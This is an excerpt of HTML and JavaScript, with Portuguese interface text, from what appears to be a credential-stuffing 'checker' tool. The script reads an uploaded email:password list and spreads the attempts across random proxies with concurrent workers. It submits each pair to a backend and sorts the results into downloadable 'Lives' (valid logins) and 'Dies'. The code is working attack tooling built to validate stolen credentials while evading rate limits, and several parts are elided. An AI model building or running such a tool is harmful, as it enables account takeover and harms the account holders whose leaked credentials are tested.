...
<main>
    ...
    <div class="results">
        <div class="result-panel">
            ...
            <div class="rp-footer">
                <a href="api.php?action=download&type=lives" target="_blank" class="btn-dl btn-dl-live">⬇ Download Lives</a>
            </div>
        </div>
        <div class="result-panel">
            <div class="rp-header">
            ...
            <div class="rp-footer">
                <a href="api.php?action=download&type=dies" target="_blank" class="btn-dl btn-dl-die">⬇ Download Dies</a>
            </div>
        </div>
    </div>
</main>
...
<script>
    ...
    async function startChecker(){
        ...
        btn.disabled=true;btn.innerHTML='<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Carregando...';
        try{
            const res=await fetch('api.php?action=init');
            const d=await res.json();proxies=d.proxies||[];
            const text=await fileInput.files[0].text();
            accounts=[];
            for(let line of text.split(/\r?\n/)){
                line=line.trim();
                if(line&&line.includes(':')){const p=line.split(':');const em=p[0].trim();const pw=p.slice(1).join(':').trim();if(em.includes('@'))accounts.push({email:em,password:pw});}
            }
            if(!accounts.length){alert('Nenhuma conta válida encontrada!');resetUI();return;}
            isRunning=true;currentIndex=0;liveCount=0;dieCount=0;
            document.getElementById('liveList').innerHTML='';document.getElementById('dieList').innerHTML='';
            document.getElementById('statTotal').textContent=accounts.length;
            updateCounts();
            btn.innerHTML='⏳ Inspecionando...';
            const workers=[];for(let i=0;i<THREADS;i++)workers.push(worker());
        ...
        }catch(err){console.error(err);alert('Erro de conexão.');resetUI();}
    }

    function resetUI(){
        isRunning=false;
        const btn=document.getElementById('startBtn');
        btn.disabled=false;btn.innerHTML='<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg> Iniciar Inspeção';
    ...
    async function worker(){
        while(currentIndex<accounts.length){
            const idx=currentIndex++;const ac=accounts[idx];
            let proxy='';if(proxies.length>0)proxy=proxies[Math.floor(Math.random()*proxies.length)];
    ...
    async function checkAccount(email,password,proxy){
        const fd=new FormData();fd.append('email',email);fd.append('password',password);if(proxy)fd.append('proxy',proxy);
        try{
            ...
            updateCounts();
        }catch{dieCount++;addToList('dieList',`${email}:${password} · ERROR`,'die-text');updateCounts();}
    }
